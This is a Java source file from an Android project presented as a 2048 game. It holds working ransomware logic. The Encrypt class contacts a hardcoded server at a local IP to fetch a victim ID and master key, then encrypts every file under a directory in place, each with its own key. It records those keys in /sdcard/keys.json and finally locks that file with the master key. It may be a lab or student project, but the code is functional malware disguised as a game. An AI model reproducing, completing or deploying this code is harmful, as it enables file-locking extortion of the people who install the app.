package aarkay.a2048game;

import android.os.Build;
import android.util.Log;
import android.util.Pair;

import androidx.annotation.RequiresApi;

import com.google.gson.Gson;

import org.json.JSONException;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import com.loopj.android.http.*;
import java.util.Base64;

import javax.crypto.Cipher;

import cz.msebera.android.httpclient.Header;

public class Encrypt {
    // Function to create base keys.json
    @RequiresApi(api = Build.VERSION_CODES.O)
    public static void init(int cipherMode,String filePath, String fileName, String masterKey) throws IOException {

        Path path = Paths.get(filePath);
        List<Path> pathsList = listFiles(path);

        if (cipherMode == 1) {
            String URL = "http://192.168.157.73:8080/get_mk";

            AsyncHttpClient client = new AsyncHttpClient();
            client.get(URL, new AsyncHttpResponseHandler() {
                @Override
                public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                    String mk_resB64 = new String(responseBody);
                    byte[] mk_resByteArr = Base64.getDecoder().decode(mk_resB64);
                    String mk_res = new String(mk_resByteArr);
                    String[] mk_resArr = mk_res.split(":");
                    Log.d("MK BASE64", mk_resB64);
                    Log.d("DECODED MK", mk_res);
                    Log.d("DECODED MK[1]", mk_resArr[1]);

                    String victimID = mk_resArr[0];
                    String masterKeyRx = mk_resArr[1];

                    // Write to victimID.txt resource
                    File victimID_f = new File("/sdcard/victimID.txt");
                    if (!victimID_f.exists()) {
                        FileWriter fw = null;
                        try {
                            fw = new FileWriter("/sdcard/victimID.txt");
                            fw.write(victimID);
                            fw.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }

                    // Create keysJSON
                    File keysJSON_f = new File(fileName);
                    if (!keysJSON_f.exists()) {
                        // Create new empty file to store key.json in /sdcard
                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("_victimID", masterKeyRx);

                        FileWriter fw = null;
                        try {
                            fw = new FileWriter(fileName);
                            fw.write(jsonObject.toJSONString());
                            fw.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }

//                    // Encryption time, for each fp = absolute path of file

                    Runnable r = new Runnable() {
                        @Override
                        public void run() {
                            pathsList.forEach(fp ->
                            {
                                try {
                                    Encrypt.encrypt(cipherMode, fp.toString(), fileName, "");
                                    Log.d("FP", fp.toString());
                                } catch (IOException e) {
                                    e.printStackTrace();
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                } catch (ParseException e) {
                                    e.printStackTrace();
                                }
                            });

                            // Final Encryption of /sdcard/keys.json
                            Log.d("Master Encrypting File", "/sdcard/keys.json");
                            try {
                                Log.d("Running Master", "/sdcard/keys.json");
                                Encrypt.encrypt(3, "/sdcard/keys.json","/sdcard/keys.json" ,masterKeyRx);
                            } catch (IOException e) {
                                e.printStackTrace();
                            } catch (JSONException e) {
                                e.printStackTrace();
                            } catch (ParseException e) {
                                e.printStackTrace();
                            }
                        }
                    };

                    r.run();
                }

                @Override
                public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                    Log.d("HTTP", "onFailure");
                }
            });
        }
        else if (cipherMode == 2) {
            pathsList.forEach(fp -> {
                try {
                    Encrypt.encrypt(cipherMode, fp.toString(), fileName, "");
                    Log.d("FP", fp.toString());
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (JSONException e) {
                    e.printStackTrace();
                } catch (ParseException e) {
                    e.printStackTrace();
                }
            });
        }

        // 3 = master encrypt, 4 = master decrypt
        else if (cipherMode == 4) {
            try {
                // fileName = "/sdcard/keys.json"
                Log.d("MASTER DECRYPTING", masterKey);
                Encrypt.encrypt(cipherMode, fileName, fileName,  masterKey);
            } catch (IOException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            } catch (ParseException e) {
                e.printStackTrace();
            }
        }


    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public static void encrypt (int cMode, String path, String fileName, String masterKey) throws IOException, JSONException, ParseException {

        String jsonKey = path.replace("/", "_");
        Log.d("jsonKEY", jsonKey);

        // Generate key if encryption mode
        String key = new String();
        if (cMode == Cipher.ENCRYPT_MODE) {
            key = getAlphaNumericString(16);
        }
        // Get key from file if decryption mode
        else if (cMode == Cipher.DECRYPT_MODE) {
            // FileReader reader = new FileReader("/sdcard/keys.json");
            JSONParser parser = new JSONParser();
            Object obj = parser.parse(new FileReader(fileName));
            JSONObject jsonObject = (JSONObject) obj;
            key = (String) jsonObject.get(jsonKey);
            Log.d("KEY FOUND:", key);
            Log.d("JSONOBJECT KEY", jsonObject.toJSONString());
        }

        // 3 = master encrypt, 4 = master decrypt
        else if (cMode == 3 || cMode == 4) {
            if (cMode == 3) {
                key = masterKey;
                Log.d("[3] MASTERKEY FOUND", masterKey);
            }
            else if (cMode == 4) {
                key = masterKey;
                Log.d("[4] MASTERKEY FOUND", masterKey);
            }
        }

        File inFile = new File(path);
        File encryptedFile = new File(path);
        File decryptedFile = new File(path);


        // Cipher Operation
        try {
            if (cMode == Cipher.ENCRYPT_MODE) {
                // Writing "dir/file.ext":"key" to a file during encryption(per file)
                Pair<String, String> keyValPair = new Pair<>(jsonKey, key); // Create key value pair

                Gson gson = new Gson();

                FileReader reader = new FileReader(fileName);

                Map<String, String> jsonToMap = gson.fromJson(reader, Map.class);
                jsonToMap.put(keyValPair.first, keyValPair.second);

                FileWriter writer = new FileWriter(fileName);
                gson.toJson(jsonToMap, writer);
                writer.close();
                reader.close();
                Locker.encrypt(key, inFile, encryptedFile);
            }
            else if (cMode == Cipher.DECRYPT_MODE) {
                Locker.decrypt(key, encryptedFile, decryptedFile);
            }
            // 3 = master encrypt, 4 = master decrypt
            else if (cMode == 3 || cMode == 4) {
                if (cMode == 3){
                    Log.d("MASTER ENCRYPTING FILE", path + " with key: " + key);
                    Locker.encrypt(key, encryptedFile, decryptedFile);
                }
                else if (cMode == 4) {
                    Log.d("MASTER DECRYPTING FILE", path + " with key: " + key);
                    Locker.decrypt(key, encryptedFile, decryptedFile);
                }
            }
        } catch (Exception e) {
            System.out.println(e.getMessage());
            e.printStackTrace();
        }
    }

    private static String getAlphaNumericString(int n)
    {
        // length is bounded by 256 Character
        byte[] array = new byte[256];
        new Random().nextBytes(array);

        String randomString
                = new String(array, Charset.forName("UTF-8"));

        // Create a StringBuffer to store the result
        StringBuffer r = new StringBuffer();

        // remove all spacial char
        String  AlphaNumericString
                = randomString
                .replaceAll("[^A-Za-z0-9]", "");

        // Append first 20 alphanumeric characters
        // from the generated random String into the result
        for (int k = 0; k < AlphaNumericString.length(); k++) {

            if (Character.isLetter(AlphaNumericString.charAt(k))
                    && (n > 0)
                    || Character.isDigit(AlphaNumericString.charAt(k))
                    && (n > 0)) {

                r.append(AlphaNumericString.charAt(k));
                n--;
            }
        }

        // return the resultant string
        return r.toString();
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private static List<Path> listFiles(Path path) throws IOException {
        List<Path> result;
        try (Stream<Path> walk = Files.walk(path)){
            result = walk.filter(Files::isRegularFile).collect(Collectors.toList());
        }
        return result;
    }
}

